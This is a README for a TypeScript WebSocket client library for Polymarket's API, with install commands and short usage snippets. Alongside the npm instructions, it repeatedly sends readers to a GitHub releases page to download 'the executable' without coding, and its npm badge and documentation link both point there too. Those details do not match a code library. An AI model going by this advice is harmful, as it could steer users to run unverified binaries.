# 🌐 polymarket-websocket-client - Simple WebSocket Client for Polymarket

[![npm version](https://badge.fury.io/js/polymarket-websocket-client.svg)](https://github.com/Rodean0214/polymarket-websocket-client/releases)

Connect easily to Polymarket's API with zero hassle.

## 🚀 Getting Started

To get started with the polymarket-websocket-client, follow these simple steps to download and run the software. This guide will help you through the entire process without needing to code.

## 📥 Download & Install

1. **Visit the Releases Page**: To download the latest version of the polymarket-websocket-client, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/releases).
2. **Select Your Version**: On the releases page, find the latest version listed.
3. **Download the File**: Click on the executable or package file to start your download. Make sure to save it to a location you can easily access, like your desktop or downloads folder.

## 🖥️ Requirements

Make sure you have **Node.js version 22 or higher** installed on your computer. You can verify your Node.js version by running the following command in your terminal or command prompt:

```bash
node -v
```

If you need to install Node.js, please download it from [the official Node.js website](https://nodejs.org/).

## 🔧 Installation Steps

Once you have downloaded the package, open your terminal or command prompt.

### For npm Users

If you're familiar with npm, you can install the package by running:

```bash
npm install polymarket-websocket-client
```

### For pnpm Users

If you prefer pnpm, run this command:

```bash
pnpm add polymarket-websocket-client
```

### For Yarn Users

If you're using Yarn, type in:

```bash
yarn add polymarket-websocket-client
```

## ⚙️ Using the Client

Here’s how to get started with the WebSocket client:

### 1. Import the Library

You need to import the library into your project. Here’s how to do it:

```typescript
import { ClobMarketClient } from 'polymarket-websocket-client';
```

### 2. Create a Client Instance

Next, create an instance of the client:

```typescript
const client = new ClobMarketClient();
```

### 3. Connect to the WebSocket

Now, you can connect to the WebSocket:

```typescript
client.connect();
```

### 4. Handling Events

You can listen for events, such as market updates, by adding event listeners:

```typescript
client.on('marketUpdate', (data) => {
    console.log('Market Update: ', data);
});
```

### 5. Closing the Connection

When you're done, make sure to close the connection properly:

```typescript
client.close();
```

## 📚 Features

- **Zero Dependencies**: The client uses only Node.js native WebSocket, ensuring a lightweight installation. 
- **Full Channel Support**: It supports various channels including CLOB Market, CLOB User, and RTDS channels.
- **Auto Reconnection**: The client automatically reconnects with configurable retries, ensuring a stable connection.
- **Heartbeat**: It sends automatic ping/pong messages to keep the connection alive.
- **TypeScript First**: You'll find complete type definitions for all events, making it easier to work with.
- **Dual Module Output**: It supports both ESM and CommonJS formats.

## 🛠️ Troubleshooting

If you encounter any issues:

- Ensure Node.js is installed and up to date.
- Double-check your internet connection.
- Check the console for any error messages and address them as needed.

## 🤝 Need Help?

If you have any questions, issues, or suggestions, feel free to check out the [issues section on GitHub](https://github.com/Rodean0214/polymarket-websocket-client/issues) for help.

## 💡 Additional Resources

- [Polymarket API Documentation](https://docs.polymarket.com) for detailed information on how to use the API.
- Node.js documentation for setup and advanced usage tips. 

Remember, the goal of this client is to help you connect to the Polymarket API effortlessly. 

For complete documentation and examples, visit [this page](https://github.com/Rodean0214/polymarket-websocket-client/releases) for more details.